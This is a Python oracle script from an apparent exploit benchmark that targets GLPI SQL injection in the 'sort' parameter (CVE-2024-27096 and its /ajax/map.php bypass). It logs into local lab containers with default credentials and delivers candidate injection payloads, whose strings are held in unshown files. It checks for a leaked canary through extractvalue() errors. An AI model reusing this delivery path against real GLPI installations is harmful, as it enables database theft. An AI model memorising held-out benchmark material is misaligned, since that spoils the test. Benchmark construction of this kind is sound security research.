#!/usr/bin/env python3
"""Flag differential oracle for glpi-search-constructsql-sqli.

Reuses benchmark/flag_oracle.py (Variant A). The flag is a per-run random canary
planted in a RESTRICTED table `pcb_canary` inside each version's GLPI database
(by the entrypoint, from ${PCB_FLAG}). A normal `User` search never exposes that
table; only an SQL injection through Search::addSelect (the `sort` param SELECT
alias) can read it, via error-based extractvalue() reflected by GLPI DEBUG mode.

Roles:
  V0 = GLPI 10.0.12  (pre CVE-2024-27096: manageParams does not int-cast `sort`)
  V1 = GLPI 10.0.14  (CVE-2024-27096 fixed in manageParams; /ajax/map.php bypass
                      still reaches the sink -> CVE-2024-31456)   <- TARGET
  V2 = GLPI 10.0.15  (CVE-2024-31456 fixed: cleanParams() in prepareDatasForSearch)

Seed  (CVE-2024-27096): injection via /ajax/search.php (manageParams path) -> blocked on V1.
Bypass(CVE-2024-31456): SAME injection via /ajax/map.php (no manageParams) -> reaches flag on V1.

Usage:
  python3 oracle.py --run-gate          # orchestrate compose up (v0,v1,v2) + gate + down
  PCB_FLAG=<tok> python3 oracle.py --gate   # gate against already-up envs
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

import secrets

import requests

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import validate_case_strict  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402


def short_flag() -> str:
    """Per-run canary. MySQL's extractvalue() error truncates the leaked string
    to ~31 chars, so the error-based exfil channel needs a short token.
    'PCB' + 16 hex = 19 chars fits comfortably (64 bits of unguessable entropy)."""
    return "PCB" + secrets.token_hex(8)


FLAG = os.environ.get("PCB_FLAG") or short_flag()

BASE = {
    "v0": "http://127.0.0.1:39820",
    "v1": "http://127.0.0.1:39821",
    "v2": "http://127.0.0.1:39822",
}

GLPI_USER = "glpi"
GLPI_PASS = "glpi"

_CSRF_RE = re.compile(r'name=["\']_glpi_csrf_token["\']\s+value=["\']([0-9a-f]+)["\']')


def _csrf(html: str):
    m = _CSRF_RE.search(html)
    return m.group(1) if m else None


def _input_name_by_id(html: str, input_id: str):
    """GLPI randomises the login/password field names (anti-bruteforce) but keeps
    stable id="login_name" / id="login_password". Resolve the real POST name."""
    m = re.search(
        r'<input[^>]*\bid="' + re.escape(input_id) + r'"[^>]*>', html)
    if not m:
        m = re.search(
            r'<input[^>]*\bname="([^"]+)"[^>]*\bid="' + re.escape(input_id) + r'"', html)
        return m.group(1) if m else None
    tag = m.group(0)
    nm = re.search(r'\bname="([^"]+)"', tag)
    return nm.group(1) if nm else None


def _login(sess: requests.Session, base: str) -> bool:
    """Authenticate as the seeded super-admin (glpi/glpi)."""
    r = sess.get(f"{base}/index.php", timeout=20)
    tok = _csrf(r.text)
    user_field = _input_name_by_id(r.text, "login_name")
    pass_field = _input_name_by_id(r.text, "login_password")
    if not tok or not user_field or not pass_field:
        return False
    sess.post(
        f"{base}/front/login.php",
        data={
            user_field: GLPI_USER,
            pass_field: GLPI_PASS,
            "_glpi_csrf_token": tok,
            "submit": "Post",
        },
        timeout=20,
        allow_redirects=True,
    )
    c = sess.get(f"{base}/front/central.php", timeout=20)
    return "login_password" not in c.text


def _fresh_token(sess: requests.Session, base: str):
    r = sess.get(f"{base}/front/preference.php", timeout=20)
    return _csrf(r.text)


def run_probe(candidate, *, version="v1"):
    """Send one candidate injection to BASE[version] via the requested GLPI
    endpoint and return an observable {version, channel, status, body}.
    Auth (glpi/glpi) + CSRF are just setup; the injection is the vuln."""
    base = BASE[version]
    channel = candidate["channel"] if isinstance(candidate, dict) else "map"
    payload = candidate["payload"] if isinstance(candidate, dict) else str(candidate)
    sess = requests.Session()
    if not _login(sess, base):
        return {"version": version, "channel": channel, "status": "login_failed", "body": ""}
    tok = _fresh_token(sess, base)
    headers = {"X-Glpi-Csrf-Token": tok or ""}
    try:
        if channel == "map":
            # /ajax/map.php: prepareDatasForSearch/constructSQL/constructData
            # WITHOUT manageParams. sort delivered as params[sort][].
            data = {
                "itemtype": "User",
                "params[sort][]": payload,
                "params[start]": "0",
                "params[is_deleted]": "0",
                "_glpi_csrf_token": tok or "",
            }
            r = sess.post(f"{base}/ajax/map.php", data=data, headers=headers, timeout=30)
        else:
            # /ajax/search.php display_results: goes through manageParams.
            data = {
                "action": "display_results",
                "itemtype": "User",
                "sort[]": payload,
                "start": "0",
                "is_deleted": "0",
                "_glpi_csrf_token": tok or "",
            }
            r = sess.post(f"{base}/ajax/search.php", data=data, headers=headers, timeout=30)
        return {"version": version, "channel": channel, "status": r.status_code, "body": r.text}
    except Exception as e:  # noqa: BLE001
        return {"version": version, "channel": channel, "status": "error", "body": repr(e)}


def original_poc(*, version="v1"):
    """[GIVEN] CVE-2024-27096 seed via /ajax/search.php (blocked on v1)."""
    return run_probe(original_candidate(), version=version)


def bypass_poc(*, version="v1"):
    """[HELD-OUT] CVE-2024-31456 residual via /ajax/map.php (reaches flag on v1)."""
    from importlib import util as _u
    spec = _u.spec_from_file_location("_bypass", HERE / "_heldout" / "bypass_poc.py")
    mod = _u.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return run_probe(mod.candidate(), version=version)


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


# --------------------------------------------------------------------------- #
# Orchestration (author side; used by --run-gate).
# --------------------------------------------------------------------------- #
def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False, env={**os.environ, **(env or {})},
    )


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def _wait_ready(version: str, tries: int = 90) -> bool:
    """Poll until GLPI serves its login page on this version's port."""
    base = BASE[version]
    for _ in range(tries):
        try:
            r = requests.get(f"{base}/index.php", timeout=10)
            if r.status_code == 200 and "_glpi_csrf_token" in r.text:
                return True
        except Exception:  # noqa: BLE001
            pass
        time.sleep(5)
    return False


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or short_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", "--remove-orphans", env=env)
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr, "stdout": r.stdout}
    ready = {v: _wait_ready(v) for v in profiles}
    result = {
        "flag": FLAG,
        "env_ready": ready,
        "original_on_v0": original_poc(version="v0"),
        "original_on_v1": original_poc(version="v1"),
        "bypass_on_v1": bypass_poc(version="v1"),
        "bypass_on_v2": bypass_poc(version="v2"),
        "original_on_v2": original_poc(version="v2"),
    }
    gate_res = validate_case_strict(
        flag=FLAG,
        original_on_v0=result["original_on_v0"],
        original_on_v1=result["original_on_v1"],
        bypass_on_v1=result["bypass_on_v1"],
        bypass_on_v2=result["bypass_on_v2"],
    )
    result["gate"] = gate_res
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--remove-orphans", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    ap.add_argument("--probe", choices=["v0", "v1", "v2"], help="debug: run both pocs on one version")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2, default=str))
    elif a.probe:
        print(json.dumps({
            "flag": FLAG,
            "original": original_poc(version=a.probe),
            "bypass": bypass_poc(version=a.probe),
        }, indent=2, default=str))
    else:
        print(json.dumps(gate(), indent=2, default=str))
